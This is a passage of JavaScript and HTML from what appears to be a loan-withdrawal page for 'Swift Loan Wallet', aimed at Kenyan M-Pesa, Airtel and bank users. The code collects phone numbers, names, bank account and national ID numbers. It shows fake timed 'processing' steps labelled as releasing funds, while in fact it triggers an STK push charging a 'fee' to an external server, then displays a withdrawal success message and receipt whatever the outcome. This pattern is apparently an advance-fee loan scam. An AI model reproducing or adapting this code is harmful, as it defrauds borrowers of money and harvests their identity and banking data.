            document.getElementById('withdrawalMethodModal').classList.remove('hidden');
            document.getElementById('withdrawalMethodModal').classList.add('flex');
        }

        // Close withdrawal method modal
        function closeWithdrawalModal() {
            document.getElementById('withdrawalMethodModal').classList.add('hidden');
            document.getElementById('withdrawalMethodModal').classList.remove('flex');
        }

        // Select withdrawal method
        function selectMethod(method) {
            selectedWithdrawalMethod = method;
            
            // Update UI to show selection
            document.querySelectorAll('.method-card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            // Show method-specific form after a short delay
            setTimeout(() => {
                closeWithdrawalModal();
                showWithdrawalDetails(method);
            }, 300);
        }

        // Show withdrawal details modal with method-specific form
        function showWithdrawalDetails(method) {
            const modal = document.getElementById('withdrawalDetailsModal');
            const title = document.getElementById('detailsModalTitle');
            const formContainer = document.getElementById('withdrawalForm');
            
            let formHTML = '';
            let titleText = '';

            switch(method) {
                case 'mpesa':
                    titleText = 'M-Pesa Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">M-Pesa Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your M-Pesa number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> M-Pesa Phone Number
                                </label>
                                <input type="tel" id="mpesaPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="mpesaPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="mpesaName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="mpesaNameError"></div>
                            </div>

                            <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-green-600 mt-0.5"></i>
                                    <div class="text-sm text-green-800">
                                        <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• You will receive an STK push notification from SwiftWallet Digital Ventures fee request.</li>
                                            <li>• Funds will be credited instantly after confirmation</li>
                                            <li>• Transaction limit: KES 300,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'airtel':
                    titleText = 'Airtel Money Withdrawal Details';
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Airtel Money Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your Airtel Money number to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-mobile-alt mr-1"></i> Airtel Money Phone Number
                                </label>
                                <input type="tel" id="airtelPhone" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="254XXXXXXXXX" value="${loanData.phone}" maxlength="12">
                                <div class="error-message hidden" id="airtelPhoneError"></div>
                                <p class="text-xs text-gray-500 mt-1">Format: 254XXXXXXXXX (without +)</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Name
                                </label>
                                <input type="text" id="airtelName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as registered" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="airtelNameError"></div>
                            </div>

                            <div class="bg-red-50 border border-red-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-red-600 mt-0.5"></i>
                                    <div class="text-sm text-red-800">
                                        <p class="font-medium mb-1">Airtel Money Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• You will receive an SMS notification with code </li>
                                            <li>• Funds will be credited within 2-3 minutes from CHASE BANK</li>
                                            <li>• Transaction limit: KES 150,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;

                case 'bank':
                    titleText = 'Bank Transfer Withdrawal Details';
                    const bankOptions = kenyanBanks.map(bank => `<option value="${bank}">${bank}</option>`).join('');
                    formHTML = `
                        <div class="space-y-4">
                            <div class="text-center mb-6">
                                <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
                                    <i class="fas fa-university text-blue-600 text-2xl"></i>
                                </div>
                                <h4 class="text-lg font-semibold">Bank Transfer</h4>
                                <p class="text-sm text-gray-600">Enter your bank details to receive funds</p>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-university mr-1"></i> Select Bank
                                </label>
                                <select id="bankName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none">
                                    <option value="">Choose your bank...</option>
                                    ${bankOptions}
                                </select>
                                <div class="error-message hidden" id="bankNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-credit-card mr-1"></i> Account Number
                                </label>
                                <input type="text" id="accountNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter your account number" maxlength="20">
                                <div class="error-message hidden" id="accountNumberError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-user mr-1"></i> Account Holder Name
                                </label>
                                <input type="text" id="accountName" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter full name as on bank account" value="${localStorage.getItem('swift_customer_name') || ''}">
                                <div class="error-message hidden" id="accountNameError"></div>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-medium text-gray-700 mb-2">
                                    <i class="fas fa-id-card mr-1"></i> ID Number
                                </label>
                                <input type="text" id="idNumber" class="form-field w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none" 
                                       placeholder="Enter National ID number" maxlength="8">
                                <div class="error-message hidden" id="idNumberError"></div>
                            </div>

                            <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                                <div class="flex items-start space-x-2">
                                    <i class="fas fa-info-circle text-blue-600 mt-0.5"></i>
                                    <div class="text-sm text-blue-800">
                                        <p class="font-medium mb-1">Bank Transfer Information:</p>
                                        <ul class="text-xs space-y-1">
                                            <li>• Funds will be credited within 3-5 minutes with approval from CHASE BANK</li>
                                            <li>• Account details must match your loan application</li>
                                            <li>• Transaction limit: KES 1,000,000 per day</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    `;
                    break;
            }

            title.textContent = titleText;
            formContainer.innerHTML = formHTML;
            
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }

        // Close withdrawal details modal
        function closeDetailsModal() {
            document.getElementById('withdrawalDetailsModal').classList.add('hidden');
            document.getElementById('withdrawalDetailsModal').classList.remove('flex');
        }

        // Validate form based on method
        function validateForm() {
            let isValid = true;
            
            // Clear previous errors
            document.querySelectorAll('.error-message').forEach(error => {
                error.classList.add('hidden');
                error.textContent = '';
            });
            
            document.querySelectorAll('.form-field').forEach(field => {
                field.classList.remove('error', 'success');
            });

            switch(selectedWithdrawalMethod) {
                case 'mpesa':
                    isValid = validateMpesaForm() && isValid;
                    break;
                case 'airtel':
                    isValid = validateAirtelForm() && isValid;
                    break;
                case 'bank':
                    isValid = validateBankForm() && isValid;
                    break;
            }

            return isValid;
        }

        function validateMpesaForm() {
            let isValid = true;
            
            const phone = document.getElementById('mpesaPhone');
            const name = document.getElementById('mpesaName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('mpesaPhone', 'mpesaPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('mpesaPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('mpesaName', 'mpesaNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('mpesaName', 'mpesaNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('mpesaName');
            }
            
            return isValid;
        }

        function validateAirtelForm() {
            let isValid = true;
            
            const phone = document.getElementById('airtelPhone');
            const name = document.getElementById('airtelName');
            
            // Validate phone
            if (!phone.value.trim()) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Phone number is required');
                isValid = false;
            } else if (!/^254[0-9]{9}$/.test(phone.value.trim())) {
                showFieldError('airtelPhone', 'airtelPhoneError', 'Enter valid format: 254XXXXXXXXX');
                isValid = false;
            } else {
                showFieldSuccess('airtelPhone');
            }
            
            // Validate name
            if (!name.value.trim()) {
                showFieldError('airtelName', 'airtelNameError', 'Account name is required');
                isValid = false;
            } else if (name.value.trim().length < 2) {
                showFieldError('airtelName', 'airtelNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('airtelName');
            }
            
            return isValid;
        }

        function validateBankForm() {
            let isValid = true;
            
            const bankName = document.getElementById('bankName');
            const accountNumber = document.getElementById('accountNumber');
            const accountName = document.getElementById('accountName');
            const idNumber = document.getElementById('idNumber');
            
            // Validate bank
            if (!bankName.value) {
                showFieldError('bankName', 'bankNameError', 'Please select a bank');
                isValid = false;
            } else {
                showFieldSuccess('bankName');
            }
            
            // Validate account number
            if (!accountNumber.value.trim()) {
                showFieldError('accountNumber', 'accountNumberError', 'Account number is required');
                isValid = false;
            } else if (!/^[0-9]{6,20}$/.test(accountNumber.value.trim())) {
                showFieldError('accountNumber', 'accountNumberError', 'Enter a valid account number (6-20 digits)');
                isValid = false;
            } else {
                showFieldSuccess('accountNumber');
            }
            
            // Validate account name
            if (!accountName.value.trim()) {
                showFieldError('accountName', 'accountNameError', 'Account holder name is required');
                isValid = false;
            } else if (accountName.value.trim().length < 2) {
                showFieldError('accountName', 'accountNameError', 'Enter a valid full name');
                isValid = false;
            } else {
                showFieldSuccess('accountName');
            }
            
            // Validate ID number
            if (!idNumber.value.trim()) {
                showFieldError('idNumber', 'idNumberError', 'ID number is required');
                isValid = false;
            } else if (!/^[0-9]{7,8}$/.test(idNumber.value.trim())) {
                showFieldError('idNumber', 'idNumberError', 'Enter a valid ID number (7-8 digits)');
                isValid = false;
            } else {
                showFieldSuccess('idNumber');
            }
            
            return isValid;
        }

        function showFieldError(fieldId, errorId, message) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            field.classList.add('error');
            error.textContent = message;
            error.classList.remove('hidden');
        }

        function showFieldSuccess(fieldId) {
            const field = document.getElementById(fieldId);
            field.classList.add('success');
        }

        // Process withdrawal (Fee payment first)
        async function processWithdrawal() {
            if (isProcessing) return;
            
            if (!validateForm()) {
                return;
            }

            isProcessing = true;
            closeDetailsModal();
            showEnhancedProcessingOverlay();

            try {
                // Get fee amount from loan data
                const feeAmount = parseFloat(loanData.fee);
                
                // Collect form data for later use
                let withdrawalData = {
                    method: selectedWithdrawalMethod,
                    loanId: loanData.tracking
                };

                let paymentPhone = loanData.phone; // Default to loan phone

                switch(selectedWithdrawalMethod) {
                    case 'mpesa':
                        paymentPhone = document.getElementById('mpesaPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('mpesaName').value;
                        break;
                    case 'airtel':
                        paymentPhone = document.getElementById('airtelPhone').value;
                        withdrawalData.phone = paymentPhone;
                        withdrawalData.name = document.getElementById('airtelName').value;
                        break;
                    case 'bank':
                        withdrawalData.bankName = document.getElementById('bankName').value;
                        withdrawalData.accountNumber = document.getElementById('accountNumber').value;
                        withdrawalData.accountName = document.getElementById('accountName').value;
                        withdrawalData.idNumber = document.getElementById('idNumber').value;
                        break;
                }

                console.log('Processing fee payment for withdrawal:', withdrawalData);

                // Store withdrawal data for after fee payment
                localStorage.setItem('swift_pending_withdrawal', JSON.stringify(withdrawalData));

                // Update processing steps
                updateProcessingStep(1, 'Validating details...');
                await delay(1500);
                
                updateProcessingStep(2, 'Sending withdrawal request to release funds..');
                await delay(1000);

                // Send STK push for fee payment using callback URL from loan-withdrawal1.html
                const response = await fetch('https://swift-capital.onrender.com/pay', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: paymentPhone,
                        amount: feeAmount,
                        tracking: loanData.tracking
                    })
                });

                const result = await response.json();
                console.log('STK Push Response:', result);

                updateProcessingStep(3, 'STK push sent successfully!');
                await delay(2000);

                // Hide processing overlay
                hideProcessingOverlay();

                // Show success message
                showSuccess(withdrawalData);

            } catch (error) {
                console.error('Withdrawal processing error:', error);
                hideProcessingOverlay();
                showError('Failed to process withdrawal. Please try again or contact support.');
                isProcessing = false;
            }
        }

        // Show enhanced processing overlay
        function showEnhancedProcessingOverlay() {
            document.getElementById('processingOverlay').classList.remove('hidden');
            
            // Reset steps
            document.getElementById('step1').innerHTML = '<i class="fas fa-circle-notch fa-spin mr-3"></i><span id="step1Text">Initializing secure connection...</span>';
            document.getElementById('step2').innerHTML = '<i class="fas fa-circle mr-3"></i><span id="step2Text">Waiting...</span>';
            document.getElementById('step3').innerHTML = '<i class="fas fa-circle mr-3"></i><span id="step3Text">Waiting...</span>';
        }

        // Hide processing overlay
        function hideProcessingOverlay() {
            document.getElementById('processingOverlay').classList.add('hidden');
            isProcessing = false;
        }

        // Update processing step
        function updateProcessingStep(stepNumber, text) {
            const stepElement = document.getElementById(`step${stepNumber}`);
            const textElement = document.getElementById(`step${stepNumber}Text`);
            
            stepElement.innerHTML = `<i class="fas fa-check-circle text-green-400 mr-3"></i><span id="step${stepNumber}Text">${text}</span>`;
            stepElement.classList.remove('text-white/70');
            stepElement.classList.add('text-white');
        }

        // Show success message
        function showSuccess(withdrawalData) {
            const loanAmount = parseFloat(loanData.amount);
            const feeAmount = parseFloat(loanData.fee);
            const availableBalance = loanAmount - feeAmount;
            
            const methodName = selectedWithdrawalMethod === 'mpesa' ? 'M-Pesa' : 
                             selectedWithdrawalMethod === 'airtel' ? 'Airtel Money' : 'Bank Transfer';
            
            const phoneNumber = withdrawalData.phone || loanData.phone;
            
            const successMsg = `
                Your withdrawal request of <strong>KES ${availableBalance.toLocaleString()}</strong> to ${methodName} has been initiated successfully! 
                Check your phone (${phoneNumber}) for the M-Pesa payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>. 
                Enter your M-Pesa PIN to complete the fee payment of KES ${feeAmount.toLocaleString()} to process your withdrawal.
            `;
            
            document.getElementById('successMessage').innerHTML = successMsg;
            document.getElementById('successAlert').classList.remove('hidden');
            
            // Update method logo
            updateSelectedMethodLogo(selectedWithdrawalMethod, methodName);
            
            // Generate receipt
            generateReceipt(withdrawalData, availableBalance);
            
            // Scroll to success message
            document.getElementById('successAlert').scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Update selected method logo in success alert
        function updateSelectedMethodLogo(method, methodName) {
            const logoElement = document.getElementById('selectedMethodLogo');
            const nameElement = document.getElementById('selectedMethodName');
            
            logoElement.className = 'w-12 h-12 rounded-lg flex items-center justify-center';
            
            switch(method) {
                case 'mpesa':
                    logoElement.classList.add('bg-green-600');
                    logoElement.innerHTML = '<i class="fas fa-mobile-alt text-white text-xl"></i>';
                    break;
                case 'airtel':
                    logoElement.classList.add('bg-red-600');
                    logoElement.innerHTML = '<i class="fas fa-mobile-alt text-white text-xl"></i>';
                    break;
                case 'bank':
                    logoElement.classList.add('bg-blue-600');
                    logoElement.innerHTML = '<i class="fas fa-university text-white text-xl"></i>';
                    break;
            }
            
            nameElement.textContent = methodName;
        }

        // Generate receipt
        function generateReceipt(withdrawalData, amount) {
            const receiptHTML = `
                <div class="bg-white border-2 border-primary rounded-xl p-6 shadow-lg">
                    <!-- Receipt Header -->
                    <div class="flex items-center justify-between mb-6 pb-4 border-b-2 border-gray-200">
                        <div class="flex items-center">
                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center mr-3">
                                <svg class="text-white" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
                                    <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 
                                             2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 
                                             10H5V9h16v8z"/>
                                    <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 
                                             7l-2 2V3h-2z"/>
                                    <circle cx="17" cy="13" r="1"/>
                                </svg>
                            </div>
                            <div>
                                <h3 class="text-lg font-bold text-gray-900">Swift Loan Wallet</h3>
                                <p class="text-xs text-gray-500">Withdrawal Receipt</p>
                            </div>
                        </div>
                        <div class="text-right">
                            <div class="bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-xs font-semibold">
                                PENDING
                            </div>
                        </div>
                    </div>

                    <!-- Receipt Details -->
                    <div class="space-y-3 mb-6">
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-600">Transaction ID:</span>
                            <span class="font-semibold text-gray-900">${loanData.tracking}</span>
                        </div>
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-600">Date & Time:</span>
                            <span class="font-semibold text-gray-900">${new Date().toLocaleString()}</span>
                        </div>
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-600">Withdrawal Method:</span>
                            <span class="font-semibold text-gray-900">${selectedWithdrawalMethod.toUpperCase()}</span>
                        </div>
                        <div class="flex justify-between text-sm">
                            <span class="text-gray-600">Account:</span>
                            <span class="font-semibold text-gray-900">${withdrawalData.phone || withdrawalData.accountNumber || 'N/A'}</span>
                        </div>
                        <div class="flex justify-between pt-3 border-t border-gray-200">
                            <span class="text-base font-bold text-gray-900">Amount:</span>
                            <span class="text-xl font-bold text-green-600">KES ${amount.toLocaleString()}</span>
                        </div>
                    </div>

                    <!-- Receipt Footer -->
                    <div class="bg-blue-50 rounded-lg p-4 text-center">
                        <p class="text-xs text-blue-800 mb-2">
                            <i class="fas fa-info-circle mr-1"></i>
                            Complete the fee payment to process your withdrawal
                        </p>
                        <button onclick="window.print()" class="mt-2 text-primary hover:text-primary-dark text-sm font-medium">
                            <i class="fas fa-print mr-1"></i>Print Receipt
                        </button>
                    </div>
                </div>
            `;
            
            document.getElementById('receiptCardContainer').innerHTML = receiptHTML;
        }

        // Show error
        function showError(message) {
            document.getElementById('errorMessage').textContent = message;
            document.getElementById('errorAlert').classList.remove('hidden');
            document.getElementById('errorAlert').scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        // Hide error
        function hideError() {
            document.getElementById('errorAlert').classList.add('hidden');
        }

        // Open help modal
        function openHelpModal() {
            document.getElementById('helpModal').classList.remove('hidden');
            document.getElementById('helpModal').classList.add('flex');
        }

        // Close help modal
        function closeHelpModal() {
            document.getElementById('helpModal').classList.add('hidden');
            document.getElementById('helpModal').classList.remove('flex');
        }

        // Placeholder functions for quick links
        function showTransactionHistory() {
            alert('Transaction history feature coming soon!');
        }

        function showFAQ() {
            alert('FAQ section coming soon!');
        }
    </script>
</body>
</html>
